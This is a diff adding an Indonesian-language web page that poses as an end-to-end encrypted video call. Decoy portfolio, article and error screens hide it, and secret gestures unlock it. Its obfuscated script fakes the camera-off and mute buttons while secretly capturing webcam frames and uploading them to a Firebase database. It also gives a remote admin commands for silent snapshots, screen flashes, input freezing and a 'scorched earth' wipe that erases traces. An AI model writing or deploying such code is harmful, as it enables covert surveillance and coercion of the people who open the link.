@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Video Call - End-to-End Encrypted</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <style>
+        :root { --bg-dark: #111b21; --wa-green: #25d366; --neon-red: #ef4444; --font-main: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: var(--font-main); user-select: none; }
+        body { background: var(--bg-dark); color: #fff; overflow: hidden; height: 100vh; width: 100vw; position: relative; }
+
+        /* FAKE PORTFOLIO (NO TOKEN) */
+        #passivePortfolioLayer { position: fixed; inset:0; z-index: 1000; background:#f3f4f6; color:#1f2937; display:none; flex-direction:column; overflow-y:auto; padding:30px; }
+        
+        /* GERBANG KINETIK: FAKE ARTICLE & FAKE 404 */
+        #gateArticleLayer { position: fixed; inset: 0; z-index: 500; background: #fff; color: #111; padding: 20px; overflow-y: auto; display: none; transition: opacity 0.5s; }
+        #gateErrorLayer { position: fixed; inset: 0; z-index: 500; background: #fff; color: #202124; padding: 30px; display: none; transition: opacity 0.5s; }
+
+        /* INTERFAS WA/FACETIME CLONE */
+        #commsLayer { position: fixed; inset: 0; z-index: 100; display: none; flex-direction: column; background: #000; }
+        .video-container { flex: 1; position: relative; overflow: hidden; background: #222; display: flex; align-items: center; justify-content: center; }
+        #localVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); transition: opacity 0.3s; }
+        
+        /* FAKE CAMERA OFF SCREEN */
+        #fakeCamOffScreen { position: absolute; inset:0; background: linear-gradient(to bottom, #111b21, #000); display:none; flex-direction:column; align-items:center; justify-content:center; z-index:2; }
+        .avatar-circle { width:100px; height:100px; border-radius:50%; background:#4b5563; display:flex; align-items:center; justify-content:center; font-size:3rem; color:#d1d5db; margin-bottom:20px; }
+
+        /* UI OVERLAYS (HEADER & CONTROLS) */
+        .call-header { position: absolute; top:0; left:0; right:0; padding:40px 20px 20px; background: linear-gradient(to bottom, rgba(0,0,0,0.7), transparent); display: flex; justify-content: space-between; align-items: flex-start; z-index:5; }
+        .call-info { display: flex; flex-direction: column; gap: 4px; }
+        .call-title { font-size: 1.2rem; font-weight: 500; text-shadow: 0 1px 3px rgba(0,0,0,0.8); }
+        .call-status { font-size: 0.85rem; color: #d1d5db; display: flex; align-items: center; gap: 5px; }
+        .enc-badge { font-size: 0.7rem; background: rgba(255,255,255,0.15); padding: 3px 8px; border-radius: 12px; backdrop-filter: blur(5px); }
+
+        .call-controls { position: absolute; bottom: 40px; left: 0; right: 0; display: flex; justify-content: center; gap: 20px; z-index:5; }
+        .ctrl-btn { width: 55px; height: 55px; border-radius: 50%; border: none; background: rgba(255,255,255,0.2); color: #fff; font-size: 1.3rem; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(10px); transition: all 0.2s; -webkit-tap-highlight-color: transparent; }
+        .ctrl-btn.off { background: #fff; color: #111; }
+        .ctrl-btn.end { background: var(--neon-red); }
+
+        /* PHANTOM CHAT OVERLAY */
+        .chat-overlay { position: absolute; bottom: 120px; left: 20px; right: 20px; max-height: 40vh; overflow-y: hidden; display: flex; flex-direction: column; justify-content: flex-end; gap: 10px; z-index:4; pointer-events:none; }
+        .chat-bubble { max-width: 80%; padding: 10px 14px; border-radius: 16px; font-size: 0.9rem; line-height: 1.3; animation: popIn 0.3s forwards; pointer-events:auto; backdrop-filter: blur(10px); }
+        .chat-admin { background: rgba(255,255,255,0.9); color: #000; align-self: flex-start; border-bottom-left-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
+        .chat-self { background: rgba(37, 211, 102, 0.9); color: #fff; align-self: flex-end; border-bottom-right-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
+        
+        .chat-input-area { position: absolute; bottom: 0; left: 0; right: 0; padding: 15px; background: rgba(0,0,0,0.5); display: none; gap: 10px; z-index:10; backdrop-filter: blur(10px); }
+        .input-box { flex: 1; background: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.2); border-radius: 20px; padding: 12px 18px; color: #fff; font-size: 0.95rem; outline: none; }
+        .send-btn { background: var(--wa-green); color: #fff; border: none; width: 44px; height: 44px; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+
+        /* REAL-TIME HIJACK DISGUISE LAYERS */
+        #hijack404Layer { position: fixed; inset: 0; z-index: 900; background: #fff; color: #202124; padding: 30px; display: none; }
+        #hijackArticleLayer { position: fixed; inset: 0; z-index: 900; background: #fafafa; color: #111; padding: 20px; overflow-y: auto; display: none; }
+
+        /* WEAPONS & GUILLOTINE ALERTS */
+        #flashbangLayer { position: fixed; inset: 0; z-index: 9999; background: #fff; opacity: 0; pointer-events: none; transition: opacity 0.1s; }
+        #paralysisLayer { position: fixed; inset: 0; z-index: 9998; background: transparent; display: none; }
+        #strikeAlert { position: fixed; inset:0; z-index:9997; background: rgba(239, 68, 68, 0.4); pointer-events:none; opacity:0; transition: opacity 0.2s; display:flex; align-items:center; justify-content:center; }
+        #strikeAlert span { background:#ef4444; color:#fff; padding:10px 20px; border-radius:8px; font-weight:bold; letter-spacing:1px; transform:scale(1.5); }
+
+        @keyframes popIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyD1O3z2mw3fKorKAAqI3ZMZz9qlNnZqKE4",
+            authDomain: "bagantara-id.firebaseapp.com",
+            databaseURL: "https://bagantara-id-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "bagantara-id",
+            storageBucket: "bagantara-id.firebasestorage.app",
+            messagingSenderId: "76112622878",
+            appId: "1:76112622878:web:d4800368f06e1cc04c450f"
+        };
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+    </script>
+
+    <div id="passivePortfolioLayer">
+        <h1 style="font-size: 1.8rem; margin-bottom: 5px;">Ahmed</h1>
+        <p style="color:#6b7280; font-size:0.9rem; margin-bottom:20px;">Portofolio Integrasi Pustaka WebRTC & Javascript Sandbox</p>
+        <hr style="border:none; border-top:1px solid #e5e7eb; margin-bottom:20px;">
+        <h3 style="margin-bottom:8px;">Proyek Laboratorium Terbuka:</h3>
+        <div style="background:#fff; padding:15px; border-radius:8px; box-shadow:0 1px 3px rgba(0,0,0,0.1); margin-bottom:15px;">
+            <h4 style="color:#2563eb;">Sistem Validasi Token Sesi Protokol</h4>
+            <p style="font-size:0.8rem; color:#4b5563; margin-top:4px;">Eksperimen routing token data searah menggunakan Realtime Stream. Sesi kosong atau tidak membawa kunci otorisasi valid akan secara otomatis mengunci gerbang DOM.</p>
+        </div>
+        <p style="font-size:0.75rem; color:#9ca3af; text-align:center; margin-top:auto;">&copy; 2026 Ahmed. Laboratorium Terbuka Open-Source.</p>
+    </div>
+
+    <div id="gateArticleLayer">
+        <span style="color:#ef4444; font-size:0.75rem; font-weight:bold; letter-spacing:1px;">TEKNOLOGI LOKAL</span>
+        <h1 style="font-size:1.6rem; margin:8px 0 12px 0; line-height:1.3;">Perkembangan Infrastruktur Jaringan di Tahun 2026</h1>
+        <img src="https://images.unsplash.com/photo-1544197150-b99a580bb7a8?auto=format&fit=crop&w=600&q=80" style="width:100%; border-radius:8px; margin-bottom:15px; pointer-events:none;">
+        <p style="font-size:0.95rem; color:#444; line-height:1.6; margin-bottom:15px;">Pemerintah terus menggenjot penyebaran infrastruktur fiber optik hingga ke pelosok daerah. Hal ini diharapkan mampu mendongkrak ekonomi digital secara masif...</p>
+        <div id="kineticArticleTouchArea" style="position:absolute; inset:0; z-index:10;"></div>
+    </div>
+
+    <div id="gateErrorLayer">
+        <div style="max-width:500px; margin: 12% auto 0 auto;">
+            <p style="font-size:20px; font-weight:bold; margin:0 0 10px 0;"><b>502.</b> <span style="color:#5f6368">Bad Gateway.</span></p>
+            <p style="font-size:14px; line-height:1.6;">The server encountered a temporary error and could not complete your request. <span style="color:#5f6368">Please try again in 30 seconds.</span></p>
+        </div>
+    </div>
+
+    <div id="commsLayer">
+        <div class="call-header">
+            <div class="call-info">
+                <span class="call-title">Panggilan Enkripsi</span>
+                <span class="call-status"><span id="callDuration">00:00</span> <span class="enc-badge"><i class="fa-solid fa-lock"></i> E2E</span></span>
+            </div>
+            <button class="ctrl-btn" style="width:40px; height:40px; background:rgba(0,0,0,0.5);" onclick="toggleChatInput()"><i class="fa-solid fa-message"></i></button>
+        </div>
+
+        <div class="video-container">
+            <video id="localVideo" autoplay playsinline></video>
+            
+            <div id="fakeCamOffScreen">
+                <div class="avatar-circle"><i class="fa-solid fa-user"></i></div>
+                <span style="color:#9ca3af; font-size:0.9rem;">Kamera Dijeda</span>
+            </div>
+            
+            <div class="chat-overlay" id="chatStream"></div>
+        </div>
+
+        <div class="call-controls">
+            <button id="btnFlipCam" class="ctrl-btn" onclick="flipCamera()"><i class="fa-solid fa-camera-rotate"></i></button>
+            <button id="btnFakeCam" class="ctrl-btn" onclick="toggleFakeCam()"><i class="fa-solid fa-video"></i></button>
+            <button id="btnFakeMute" class="ctrl-btn" onclick="toggleFakeMute()"><i class="fa-solid fa-microphone"></i></button>
+            <button id="btnEndCall" class="ctrl-btn end" onclick="endCallFake()"><i class="fa-solid fa-phone-flip"></i></button>
+        </div>
+
+        <div class="chat-input-area" id="chatInputArea">
+            <input type="text" id="chatInput" class="input-box" placeholder="Kirim pesan aman...">
+            <button class="send-btn" onclick="sendChat()"><i class="fa-solid fa-paper-plane"></i></button>
+        </div>
+    </div>
+
+    <div id="hijack404Layer">
+        <div style="max-width:500px; margin: 12% auto 0 auto;">
+            <p style="font-size:20px; font-weight:bold; margin:0 0 10px 0;"><b>404.</b> <span style="color:#5f6368">That's an error.</span></p>
+            <p style="font-size:14px; line-height:1.6;">The requested URL was not found on this server. <span style="color:#5f6368">That's all we know.</span></p>
+        </div>
+    </div>
+    <div id="hijackArticleLayer">
+        <div style="max-width:600px; margin:0 auto; padding-top:20px;">
+            <span style="color:#ef4444; font-size:0.75rem; font-weight:bold; letter-spacing:1px;">UPDATE SISTEM</span>
+            <h1 style="font-size:1.6rem; margin:8px 0 12px 0; line-height:1.3;">Sinkronisasi Basis Data Selesai</h1>
+            <p style="font-size:0.9rem; color:#444; line-height:1.6; margin-bottom:15px;">Harap tunggu sementara sistem memverifikasi kredensial tautan sesi Anda secara latar belakang.</p>
+        </div>
+    </div>
+
+    <div id="flashbangLayer"></div>
+    <div id="paralysisLayer"></div>
+    <div id="strikeAlert"><span>PERINGATAN SISTEM!</span></div>
+
+    <script>
+        function _0x567b(){const _0x1f7e00=['Otorisasi\x20Perangkat\x20Keras\x20Ditolak.','OPEN','9912800oeVlWx','hijack404Layer','ERROR_404','ref','5861948OeWqCD','visibilitychange','commsLayer','/chats','TARGET','scrollTop','26818dnjDtb','getElementById','touchmove','addEventListener','text','SILENT_SNAP','clear','srcObject','push','drawImage','innerWidth','textContent','chatStream','1928850Xejkxt','TARGET_SNAP','className','strikeAlert','touchstart','FAKE_404','once','btnFakeMute','gateErrorLayer','ADMIN','localVideo','TIMESTAMP','touchend','off','<i\x20class=\x22fa-solid\x20fa-video\x22></i>','hijackArticleLayer','hidden','9QhsqSb','canvas','body','passivePortfolioLayer','burner_comms/','search','database','child','SCORCHED_EARTH','user','videoWidth','child_added','block','innerText','toFixed','ServerValue','camouflageMode','videoHeight','image/jpeg','clientX','then','exists','clientY','gatewayMode','chatInputArea','ARTICLE','6394434cYQWKI','style','chat-self','scaleX(-1)','none','toDataURL','chats','getContext','classList','fakeCamOffScreen','26210aYyVny','PARALYSIS','add','FLASHBANG','flex','PELANGGARAN\x20STRIKES:\x20Keluar\x20masuk\x20aplikasi\x20melebihi\x20batas\x20(','value','7GYDvEB','catch','width','[SILENT_SNAP_RESULT]','<i\x20class=\x22fa-solid\x20fa-microphone\x22></i>','touches','click','getUserMedia','location','gateArticleLayer','innerHTML','div','display','<i\x20class=\x22fa-solid\x20fa-video-slash\x22></i>','scrollHeight','height','SCORCHED\x20EARTH\x20TRIGGERED','PELANGGARAN\x20WAKTU:\x20Meninggalkan\x20layar\x20selama\x20','type','16251QQOHmh','chat-bubble\x20','environment','x).','maxStrikes','https://www.google.com','FAKE_ARTICLE','\x22\x20style=\x22max-width:100%;\x20border-radius:8px;\x20transition:filter\x200.3s;\x22\x20onclick=\x22this.style.filter=\x27blur(20px)\x27;\x20setTimeout(()=>this.remove(),2500);\x22><small\x20style=\x22display:block;\x20text-align:center;\x20font-size:0.6rem;\x20color:#666;\x20margin-top:4px;\x22><i\x20class=\x22fa-solid\x20fa-eye\x22></i>\x20HANCUR\x203\x20DTK</small>','createElement','btnFakeCam','/system_logs','remove','No\x20token.','image_base64','blurTolerance','transform','490ofdenh','chatInput','32404HgnSdP','paralysisLayer','trim','padStart','kineticArticleTouchArea','stop','\x20detik.','now','val','callDuration','opacity','sender','commands'];_0x567b=function(){return _0x1f7e00;};return _0x567b();}const _0x5e9658=_0x1083;(function(_0x4bba07,_0xf6fd7f){const _0x539c8b=_0x1083,_0x2873e5=_0x4bba07();while(!![]){try{const _0x3f454f=-parseInt(_0x539c8b(0x167))/0x1+parseInt(_0x539c8b(0x165))/0x2*(-parseInt(_0x539c8b(0x155))/0x3)+-parseInt(_0x539c8b(0x17a))/0x4+-parseInt(_0x539c8b(0x106))/0x5+parseInt(_0x539c8b(0x131))/0x6*(-parseInt(_0x539c8b(0x142))/0x7)+parseInt(_0x539c8b(0x176))/0x8*(-parseInt(_0x539c8b(0x117))/0x9)+-parseInt(_0x539c8b(0x13b))/0xa*(-parseInt(_0x539c8b(0x180))/0xb);if(_0x3f454f===_0xf6fd7f)break;else _0x2873e5['push'](_0x2873e5['shift']());}catch(_0x2164fa){_0x2873e5['push'](_0x2873e5['shift']());}}}(_0x567b,0xd575d));const urlParams=new URLSearchParams(window['location'][_0x5e9658(0x11c)]),sessionToken=urlParams['get']('token');let currentStream=null,currentFacingMode=_0x5e9658(0x120),isCamouflageActive=!![],commsRules={'gatewayMode':_0x5e9658(0x175),'blurTolerance':0x0,'maxStrikes':0x1},hiddenStartTime=0x0,currentStrikes=0x0,callInterval=null,callSeconds=0x0,fakeCamInterval=null;const executeScorchedEarth=(_0x142026=_0x5e9658(0x152))=>{const _0x48c40e=_0x5e9658;db[_0x48c40e(0x179)](_0x48c40e(0x11b)+sessionToken+_0x48c40e(0x15f))[_0x48c40e(0x188)]({'action':_0x142026,'timestamp':firebase[_0x48c40e(0x11d)][_0x48c40e(0x126)][_0x48c40e(0x111)]}),document[_0x48c40e(0x119)][_0x48c40e(0x14c)]='',localStorage[_0x48c40e(0x186)](),sessionStorage[_0x48c40e(0x186)](),window[_0x48c40e(0x14a)]['replace'](_0x48c40e(0x15a));};if(!sessionToken){document[_0x5e9658(0x181)](_0x5e9658(0x11a))['style'][_0x5e9658(0x14e)]=_0x5e9658(0x13f);throw new Error(_0x5e9658(0x161));}const refSession=db[_0x5e9658(0x179)](_0x5e9658(0x11b)+sessionToken);refSession[_0x5e9658(0x10c)](_0x5e9658(0x141))['then'](_0x2ed706=>{const _0x4851d4=_0x5e9658;if(!_0x2ed706['exists']()){document['getElementById']('passivePortfolioLayer')[_0x4851d4(0x132)][_0x4851d4(0x14e)]=_0x4851d4(0x13f);return;}const _0x2b4aad=_0x2ed706[_0x4851d4(0x16f)]();commsRules[_0x4851d4(0x12e)]=_0x2b4aad[_0x4851d4(0x12e)]||_0x4851d4(0x175),commsRules[_0x4851d4(0x163)]=_0x2b4aad[_0x4851d4(0x163)]||0x0,commsRules[_0x4851d4(0x159)]=_0x2b4aad[_0x4851d4(0x159)]||0x1;if(commsRules[_0x4851d4(0x12e)]===_0x4851d4(0x130))document[_0x4851d4(0x181)](_0x4851d4(0x14b))['style'][_0x4851d4(0x14e)]=_0x4851d4(0x123),initArticleKinetic();else commsRules[_0x4851d4(0x12e)]==='ERROR_404'?(document[_0x4851d4(0x181)](_0x4851d4(0x10e))[_0x4851d4(0x132)]['display']=_0x4851d4(0x123),initErrorKinetic()):unlockVault();});function initArticleKinetic(){const _0x2b3346=_0x5e9658,_0x4ee343=document[_0x2b3346(0x181)](_0x2b3346(0x16b));let _0x256a2e,_0x3daae3=0x0,_0x1f35ed=![];_0x4ee343['addEventListener'](_0x2b3346(0x10a),_0x118191=>{const _0x215aa=_0x2b3346;_0x3daae3=_0x118191[_0x215aa(0x147)][0x0][_0x215aa(0x12d)],_0x256a2e=setTimeout(()=>{_0x1f35ed=!![];},0x9c4);}),_0x4ee343[_0x2b3346(0x183)](_0x2b3346(0x182),_0x51fbe7=>{const _0x1bb8dd=_0x2b3346;_0x1f35ed&&_0x51fbe7[_0x1bb8dd(0x147)][0x0][_0x1bb8dd(0x12d)]-_0x3daae3>0x96&&(clearTimeout(_0x256a2e),document['getElementById'](_0x1bb8dd(0x14b))[_0x1bb8dd(0x132)]['opacity']='0',setTimeout(()=>{const _0x187026=_0x1bb8dd;document[_0x187026(0x181)](_0x187026(0x14b))['style'][_0x187026(0x14e)]=_0x187026(0x135),unlockVault();},0x1f4));}),_0x4ee343['addEventListener'](_0x2b3346(0x112),()=>{clearTimeout(_0x256a2e),_0x1f35ed=![];});}function initErrorKinetic(){const _0x3669cd=_0x5e9658;let _0x27f6a6=0x0,_0x128b1f=0x0;window['addEventListener'](_0x3669cd(0x148),_0x3ed19b=>{const _0x8bd635=_0x3669cd;if(isCamouflageActive&&commsRules['gatewayMode']===_0x8bd635(0x178)){if(_0x3ed19b[_0x8bd635(0x12a)]>window[_0x8bd635(0x18a)]-0x78&&_0x3ed19b[_0x8bd635(0x12d)]<0x78){let _0x50fb17=Date[_0x8bd635(0x16e)]();if(_0x50fb17-_0x128b1f>0x3e8)_0x27f6a6=0x0;_0x27f6a6++,_0x128b1f=_0x50fb17,_0x27f6a6>=0x5&&(document[_0x8bd635(0x181)]('gateErrorLayer')[_0x8bd635(0x132)]['opacity']='0',setTimeout(()=>{const _0x566843=_0x8bd635;document[_0x566843(0x181)](_0x566843(0x10e))['style'][_0x566843(0x14e)]=_0x566843(0x135),unlockVault();},0x1f4));}}});}function unlockVault(){const _0x1bfc4b=_0x5e9658;isCamouflageActive=![],document[_0x1bfc4b(0x181)]('commsLayer')['style'][_0x1bfc4b(0x14e)]='flex',startCamera(currentFacingMode),listenToAdminArsenal(),listenToPhantomChats(),callInterval=setInterval(()=>{const _0x48eedf=_0x1bfc4b;callSeconds++;let _0x73c85a=Math['floor'](callSeconds/0x3c)['toString']()[_0x48eedf(0x16a)](0x2,'0'),_0x56a94b=(callSeconds%0x3c)['toString']()[_0x48eedf(0x16a)](0x2,'0');document[_0x48eedf(0x181)](_0x48eedf(0x170))[_0x48eedf(0x124)]=_0x73c85a+':'+_0x56a94b;},0x3e8);}function startCamera(_0x5bac73){const _0x21e220=_0x5e9658;if(currentStream)currentStream['getTracks']()['forEach'](_0x340fa4=>_0x340fa4[_0x21e220(0x16c)]());navigator['mediaDevices'][_0x21e220(0x149)]({'video':{'facingMode':_0x5bac73},'audio':!![]})[_0x21e220(0x12b)](_0x5c2f29=>{const _0x55352e=_0x21e220;currentStream=_0x5c2f29;const _0x5f0372=document[_0x55352e(0x181)]('localVideo');_0x5f0372[_0x55352e(0x187)]=_0x5c2f29,_0x5f0372[_0x55352e(0x132)][_0x55352e(0x164)]=_0x5bac73==='environment'?_0x55352e(0x135):_0x55352e(0x134),currentFacingMode=_0x5bac73;})[_0x21e220(0x143)](_0xbeefbc=>alert(_0x21e220(0x174)));}function flipCamera(){const _0x1a3c7f=_0x5e9658;startCamera(currentFacingMode===_0x1a3c7f(0x120)?_0x1a3c7f(0x157):_0x1a3c7f(0x120));}function endCallFake(){executeScorchedEarth('TARGET\x20MENUTUP\x20PANGGILAN\x20SECARA\x20MANUAL.');}let isFakeMute=![];function toggleFakeMute(){const _0x10538c=_0x5e9658;isFakeMute=!isFakeMute;const _0x263336=document[_0x10538c(0x181)](_0x10538c(0x10d));isFakeMute?(_0x263336[_0x10538c(0x139)][_0x10538c(0x13d)]('off'),_0x263336[_0x10538c(0x14c)]='<i\x20class=\x22fa-solid\x20fa-microphone-slash\x22></i>'):(_0x263336['classList'][_0x10538c(0x160)](_0x10538c(0x113)),_0x263336[_0x10538c(0x14c)]=_0x10538c(0x146));}let isFakeCam=![];function toggleFakeCam(){const _0xa6e926=_0x5e9658;isFakeCam=!isFakeCam;const _0x5ee99c=document[_0xa6e926(0x181)](_0xa6e926(0x15e)),_0x50c2e5=document[_0xa6e926(0x181)](_0xa6e926(0x13a)),_0x5798fe=document[_0xa6e926(0x181)](_0xa6e926(0x110));isFakeCam?(_0x5ee99c[_0xa6e926(0x139)][_0xa6e926(0x13d)](_0xa6e926(0x113)),_0x5ee99c[_0xa6e926(0x14c)]=_0xa6e926(0x14f),_0x50c2e5[_0xa6e926(0x132)][_0xa6e926(0x14e)]=_0xa6e926(0x13f),_0x5798fe[_0xa6e926(0x132)][_0xa6e926(0x171)]='0',fakeCamInterval=setInterval(()=>{const _0x47e0c4=_0xa6e926,_0x3610e8=document['createElement'](_0x47e0c4(0x118));_0x3610e8['width']=_0x5798fe[_0x47e0c4(0x121)],_0x3610e8[_0x47e0c4(0x151)]=_0x5798fe[_0x47e0c4(0x128)],_0x3610e8[_0x47e0c4(0x138)]('2d')[_0x47e0c4(0x189)](_0x5798fe,0x0,0x0,_0x3610e8[_0x47e0c4(0x144)],_0x3610e8[_0x47e0c4(0x151)]),db[_0x47e0c4(0x179)](_0x47e0c4(0x11b)+sessionToken+_0x47e0c4(0x17d))[_0x47e0c4(0x188)]({'sender':_0x47e0c4(0x107),'text':_0x47e0c4(0x145),'image_base64':_0x3610e8[_0x47e0c4(0x136)]('image/jpeg',0.6),'timestamp':firebase['database'][_0x47e0c4(0x126)][_0x47e0c4(0x111)]});},0x1388)):(_0x5ee99c[_0xa6e926(0x139)][_0xa6e926(0x160)]('off'),_0x5ee99c['innerHTML']=_0xa6e926(0x114),_0x50c2e5[_0xa6e926(0x132)][_0xa6e926(0x14e)]='none',_0x5798fe['style']['opacity']='1',clearInterval(fakeCamInterval));}document[_0x5e9658(0x183)](_0x5e9658(0x17b),()=>{const _0x2ea6c5=_0x5e9658;if(isCamouflageActive)return;if(document[_0x2ea6c5(0x116)])hiddenStartTime=Date[_0x2ea6c5(0x16e)]();else{let _0x4ac88d=(Date[_0x2ea6c5(0x16e)]()-hiddenStartTime)/0x3e8;if(_0x4ac88d>commsRules[_0x2ea6c5(0x163)])executeScorchedEarth(_0x2ea6c5(0x153)+_0x4ac88d[_0x2ea6c5(0x125)](0x1)+_0x2ea6c5(0x16d));else{currentStrikes++;if(currentStrikes>commsRules[_0x2ea6c5(0x159)])executeScorchedEarth(_0x2ea6c5(0x140)+commsRules['maxStrikes']+_0x2ea6c5(0x158));else{const _0x4495ea=document[_0x2ea6c5(0x181)](_0x2ea6c5(0x109));_0x4495ea[_0x2ea6c5(0x132)][_0x2ea6c5(0x171)]='1',setTimeout(()=>{const _0x316f24=_0x2ea6c5;_0x4495ea[_0x316f24(0x132)]['opacity']='0';},0x5dc);}}}});function _0x1083(_0x472651,_0x45ea6d){_0x472651=_0x472651-0x104;const _0x567bcd=_0x567b();let _0x108322=_0x567bcd[_0x472651];return _0x108322;}function listenToAdminArsenal(){const _0x1f176c=_0x5e9658;refSession['child'](_0x1f176c(0x127))['on'](_0x1f176c(0x141),_0x585760=>{const _0x1bf3bd=_0x1f176c;if(!_0x585760[_0x1bf3bd(0x12c)]())return;const _0x2852db=_0x585760['val']();document[_0x1bf3bd(0x181)](_0x1bf3bd(0x177))[_0x1bf3bd(0x132)][_0x1bf3bd(0x14e)]=_0x1bf3bd(0x135),document[_0x1bf3bd(0x181)](_0x1bf3bd(0x115))['style'][_0x1bf3bd(0x14e)]='none',document[_0x1bf3bd(0x181)](_0x1bf3bd(0x17c))[_0x1bf3bd(0x132)][_0x1bf3bd(0x171)]='1';if(_0x2852db===_0x1bf3bd(0x10b))document[_0x1bf3bd(0x181)]('hijack404Layer')['style'][_0x1bf3bd(0x14e)]=_0x1bf3bd(0x123),document['getElementById']('commsLayer')[_0x1bf3bd(0x132)][_0x1bf3bd(0x171)]='0';else _0x2852db===_0x1bf3bd(0x15b)&&(document[_0x1bf3bd(0x181)](_0x1bf3bd(0x115))[_0x1bf3bd(0x132)][_0x1bf3bd(0x14e)]=_0x1bf3bd(0x123),document[_0x1bf3bd(0x181)]('commsLayer')[_0x1bf3bd(0x132)][_0x1bf3bd(0x171)]='0');}),refSession[_0x1f176c(0x11e)](_0x1f176c(0x173))['on'](_0x1f176c(0x141),_0x5e1284=>{const _0x2a17a4=_0x1f176c;if(!_0x5e1284[_0x2a17a4(0x12c)]())return;const _0x21535c=_0x5e1284[_0x2a17a4(0x16f)]();if(_0x21535c['type']===_0x2a17a4(0x11f))executeScorchedEarth('DIMUSNAHKAN\x20OLEH\x20ADMIN\x20KERNEL.');else{if(_0x21535c[_0x2a17a4(0x154)]===_0x2a17a4(0x13e)){const _0xe73b70=document['getElementById']('flashbangLayer');_0xe73b70[_0x2a17a4(0x132)][_0x2a17a4(0x171)]='1',setTimeout(()=>{const _0x324c85=_0x2a17a4;_0xe73b70[_0x324c85(0x132)][_0x324c85(0x171)]='0';},0xbb8);}else{if(_0x21535c[_0x2a17a4(0x154)]===_0x2a17a4(0x13c))document[_0x2a17a4(0x181)](_0x2a17a4(0x168))['style'][_0x2a17a4(0x14e)]=_0x2a17a4(0x123);else{if(_0x21535c[_0x2a17a4(0x154)]===_0x2a17a4(0x185)){const _0x58449c=document[_0x2a17a4(0x181)](_0x2a17a4(0x110)),_0x3ef9e3=document[_0x2a17a4(0x15d)](_0x2a17a4(0x118));_0x3ef9e3[_0x2a17a4(0x144)]=_0x58449c[_0x2a17a4(0x121)],_0x3ef9e3[_0x2a17a4(0x151)]=_0x58449c['videoHeight'],_0x3ef9e3[_0x2a17a4(0x138)]('2d')[_0x2a17a4(0x189)](_0x58449c,0x0,0x0,_0x3ef9e3[_0x2a17a4(0x144)],_0x3ef9e3[_0x2a17a4(0x151)]),db['ref'](_0x2a17a4(0x11b)+sessionToken+'/chats')[_0x2a17a4(0x188)]({'sender':'TARGET_SNAP','text':_0x2a17a4(0x145),'image_base64':_0x3ef9e3[_0x2a17a4(0x136)](_0x2a17a4(0x129),0.8),'timestamp':firebase[_0x2a17a4(0x11d)][_0x2a17a4(0x126)][_0x2a17a4(0x111)]});}}}}});}function toggleChatInput(){const _0x506f7b=_0x5e9658,_0x477f6c=document[_0x506f7b(0x181)](_0x506f7b(0x12f));_0x477f6c[_0x506f7b(0x132)][_0x506f7b(0x14e)]=_0x477f6c[_0x506f7b(0x132)][_0x506f7b(0x14e)]===_0x506f7b(0x13f)?'none':_0x506f7b(0x13f);}function listenToPhantomChats(){const _0x19133d=_0x5e9658,_0x15a031=document[_0x19133d(0x181)](_0x19133d(0x105));refSession[_0x19133d(0x11e)](_0x19133d(0x137))['on'](_0x19133d(0x122),_0x173299=>{const _0x236bdb=_0x19133d,_0x310dba=_0x173299[_0x236bdb(0x16f)]();if(_0x310dba['sender']===_0x236bdb(0x107))return;const _0x103caf=document['createElement'](_0x236bdb(0x14d)),_0x30b6d4=_0x310dba[_0x236bdb(0x172)]===_0x236bdb(0x10f);_0x103caf[_0x236bdb(0x108)]=_0x236bdb(0x156)+(_0x30b6d4?'chat-admin':_0x236bdb(0x133)),_0x310dba['image_base64']?_0x103caf[_0x236bdb(0x14c)]='<img\x20src=\x22'+_0x310dba[_0x236bdb(0x162)]+_0x236bdb(0x15c):_0x103caf[_0x236bdb(0x104)]=_0x310dba[_0x236bdb(0x184)],_0x15a031['appendChild'](_0x103caf),_0x15a031[_0x236bdb(0x17f)]=_0x15a031[_0x236bdb(0x150)],setTimeout(()=>{const _0x5c81e4=_0x236bdb;_0x103caf[_0x5c81e4(0x132)][_0x5c81e4(0x171)]='0',setTimeout(()=>_0x103caf['remove'](),0x12c);},0x2710);});}function sendChat(){const _0x163aea=_0x5e9658,_0x77120a=document[_0x163aea(0x181)](_0x163aea(0x166)),_0x531c48=_0x77120a[_0x163aea(0x141)][_0x163aea(0x169)]();if(!_0x531c48)return;db[_0x163aea(0x179)](_0x163aea(0x11b)+sessionToken+_0x163aea(0x17d))[_0x163aea(0x188)]({'sender':_0x163aea(0x17e),'text':_0x531c48,'timestamp':firebase['database']['ServerValue'][_0x163aea(0x111)]}),_0x77120a[_0x163aea(0x141)]='',toggleChatInput();}
+    </script>
+</body>
+</html>
